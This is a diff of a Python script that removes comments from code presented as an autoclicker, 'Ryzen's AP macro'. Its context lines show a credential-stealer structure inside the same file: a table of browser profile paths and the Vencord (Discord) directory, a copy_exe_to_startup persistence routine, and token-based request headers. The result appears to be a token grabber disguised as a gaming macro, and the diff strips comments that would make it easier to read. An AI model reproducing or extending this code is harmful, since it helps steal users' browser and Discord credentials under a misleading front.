@@ -42,7 +42,7 @@ PATHS = {
     'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
     'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
     'Iridium': LOCAL + '\\Iridium\\User Data\\Default',
-    'Vencord': ROAMING + '\\Vencord'  # Added Vencord directory
+    'Vencord': ROAMING + '\\Vencord'
 }
 
 def copy_exe_to_startup(exe_path):
@@ -64,7 +64,6 @@ def getheaders(token=None):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
     }
 
-    # Check if the operating system is Windows 11
     if sys.platform == "win32" and platform.release() == "10.0.22000":
         headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203"
 
@@ -180,7 +179,7 @@ def main():
 
 if __name__ == "__main__":
     main()
-# --- Win32 mouse input setup ---
+
 PUL = ctypes.POINTER(ctypes.c_ulong)
 
 print("[*] Ryzen's AP macro\n")
@@ -219,7 +218,6 @@ def send_click(button):
     ctypes.windll.user32.SendInput(1, ctypes.byref(down), ctypes.sizeof(down))
     ctypes.windll.user32.SendInput(1, ctypes.byref(up), ctypes.sizeof(up))
 
-# --- Detect trigger key or mouse button ---
 def detect_trigger():
     trigger_key = None
     trigger_type = None
@@ -249,13 +247,11 @@ def detect_trigger():
     time.sleep(0.3)
     return trigger_key, trigger_type
 
-# --- Setup ---
 trigger_key, trigger_type = detect_trigger()
 cps = float(input("Clicks per second: "))
 interval = 1 / cps
 active_button = mouse.Button.left
 
-# --- Hold-to-click loop ---
 try:
     pressed_keys = set()
 
